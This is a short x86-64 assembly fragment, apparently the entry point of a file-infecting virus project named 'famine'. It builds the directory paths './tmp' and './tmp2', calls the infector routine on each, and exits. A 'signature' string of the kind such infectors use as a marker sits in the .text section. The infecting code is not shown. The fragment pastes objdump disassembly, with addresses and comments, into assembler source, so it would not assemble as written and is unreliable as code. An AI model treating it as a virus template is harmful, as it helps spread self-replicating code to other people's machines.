section .text
    global _start
    signature db "this is my signature", 0
   
   sub    rsp,0x18
   lea    rdi,[rsp+0x3]
   mov    DWORD PTR [rsp+0x9],0x6d742f2e
   mov    DWORD PTR [rsp+0x3],0x6d742f2e
   mov    WORD PTR [rsp+0x7],0x70
   mov    DWORD PTR [rsp+0xc],0x32706d
   call   QWORD PTR [rip+0xc5]        # 0x1130 <famine>
   lea    rdi,[rsp+0x9]
   call   0x1130 <famine>
   mov    r8d,0x3c
   xor    ecx,ecx
   xor    edx,edx
   xor    esi,esi
   xor    edi,edi
   call   QWORD PTR [rip+0x367]        # 0x13f0 <ft_syscall>
   add    rsp,0x18
   ret 